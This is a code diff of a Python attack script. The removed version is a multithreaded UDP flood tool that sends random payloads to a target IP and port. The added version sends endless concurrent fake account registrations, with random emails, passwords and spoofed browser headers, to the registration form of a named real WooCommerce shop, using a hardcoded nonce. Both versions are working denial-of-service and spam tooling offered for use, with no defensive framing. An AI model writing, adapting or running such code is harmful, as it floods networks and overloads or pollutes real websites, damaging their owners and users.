@@ -1,70 +1,88 @@
-import socket
+import requests
 import random
-import time
-import sys
-import threading
+import string
+import concurrent.futures
 
-def udp_attack(target_ip, target_port, duration, proxies, rpc, lock):
-    end_time = time.time() + duration
-    payload = random._urandom(1024)  # 1024-byte random payload
+# Load user agents from file
+with open('ua.txt', 'r') as ua_file:
+    user_agents = ua_file.read().splitlines()
 
-    while time.time() < end_time:
-        with lock:
-            if not proxies:
-                break
-            proxy = random.choice(proxies)
+# Possible email domains
+email_domains = ["gmail.com", "yahoo.com", "yahoo.co.id", "hotmail.com", "hotmail.co.id"]
 
-        proxy_ip, proxy_port = proxy.split(":")
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.settimeout(0.1)  # Set a short timeout for the connection
-            sock.sendto(payload, (target_ip, target_port))  # Send a test packet
-            sock.recvfrom(1024)  # Try to receive a response to check if the proxy is live
+# Generate random email
+def generate_email():
+    name_part = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(random.randint(10, 18)))
+    domain = random.choice(email_domains)
+    return f"{name_part}@{domain}"
 
-            for _ in range(rpc):
-                sock.sendto(payload, (target_ip, target_port))
-            print(f"Attack successfully sent to {target_ip}:{target_port} with proxy {proxy_ip}:{proxy_port}")
-        except Exception as e:
-            with lock:
-                if proxy in proxies:
-                    proxies.remove(proxy)
-            print(f"Attack failed, [Reason : {str(e)}]. Proxy {proxy_ip}:{proxy_port} removed from list.")
-        finally:
-            sock.close()
+# Generate random password
+def generate_password():
+    length = random.randint(12, 15)
+    all_chars = string.ascii_letters + string.digits + "!@#$%^&*()-_=+"
+    password = ''.join(random.choice(all_chars) for _ in range(length))
+    return password
 
-def start_attack(target_ip, target_port, duration, proxy_file, threads, rpc):
+# Function to send POST request
+def send_post_request():
+    email = generate_email()
+    password = generate_password()
+    nonce = "b20314b1d4"
+    data = {
+        "username": email.split('@')[0],
+        "email": email,
+        "password": password,
+        "woocommerce-register-nonce": nonce,
+        "_wp_http_referer": "/my-account/",
+        "register": "Register"
+    }
+
+    headers = {
+        "User-Agent": random.choice(user_agents),
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Accept-Encoding": "gzip, deflate, br, zstd",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Origin": "https://pantaibsb.com",
+        "DNT": "1",
+        "Sec-GPC": "1",
+        "Connection": "keep-alive",
+        "Referer": "https://pantaibsb.com/my-account/",
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-Fetch-User": "?1",
+        "Priority": "u=0, i",
+        "TE": "trailers"
+    }
+
+    session = requests.Session()
+
     try:
-        with open(proxy_file, 'r') as file:
-            proxies = file.read().splitlines()
-    except FileNotFoundError:
-        print(f"Proxy file '{proxy_file}' not found.")
-        sys.exit(1)
+        response = session.post("https://pantaibsb.com/my-account/", headers=headers, data=data, timeout=20)
+        if response.status_code == 200:
+            send_post_request.success_counter += 1
+            print(f"Data {send_post_request.success_counter} has successfully submitted! [{email}]:[{password}] [Total Data Sent: {send_post_request.success_counter}] [Website still normal on Status {response.status_code}]")
+            return True
+        else:
+            print(f"Data has failed to submit! [REASON: HTTP Status {response.status_code}]")
+            return False
+    except requests.exceptions.RequestException as e:
+        print(f"Data has failed to submit! [REASON: {str(e)}]")
+        return False
 
-    lock = threading.Lock()
-    thread_list = []
+send_post_request.success_counter = 0
 
-    for _ in range(threads):
-        thread = threading.Thread(target=udp_attack, args=(target_ip, target_port, duration, proxies, rpc, lock))
-        thread.start()
-        thread_list.append(thread)
-
-    for thread in thread_list:
-        thread.join()
+# Main function to handle sending 20 data entries at a time with no delay
+def main():
+    while True:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
+            futures = [executor.submit(send_post_request) for _ in range(20)]
+            results = [future.result() for future in concurrent.futures.as_completed(futures)]
 
 if __name__ == "__main__":
-    if len(sys.argv) != 6:
-        print("Usage: python3 udp.py IP:PORT [proxy filename] [Duration in seconds] [Threads] [RPC]")
-        sys.exit(1)
-
-    target = sys.argv[1].split(":")
-    if len(target) != 2:
-        print("Invalid target format. Expected format: IP:PORT")
-        sys.exit(1)
-
-    target_ip, target_port = target[0], int(target[1])
-    proxy_file = sys.argv[2]
-    duration = int(sys.argv[3])
-    threads = int(sys.argv[4])
-    rpc = int(sys.argv[5])
-
-    start_attack(target_ip, target_port, duration, proxy_file, threads, rpc)
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\nProcess interrupted by user. Exiting...")
